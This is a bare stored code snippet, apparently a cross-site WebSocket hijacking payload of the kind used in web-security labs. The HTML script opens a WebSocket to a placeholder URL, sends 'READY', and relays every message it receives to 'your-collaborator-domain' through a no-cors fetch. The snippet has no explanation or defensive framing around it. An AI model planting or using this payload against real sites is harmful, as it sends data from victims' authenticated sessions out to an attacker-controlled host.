---
id: d122d13e-f0a2-47d8-89cf-be2c9881fd63
type: code
language: ''
verified: false
created_at: '2020-08-22T13:07:06.695938+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet d122d13e

```
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY");
}
function handleReply(event) {
  fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>

```


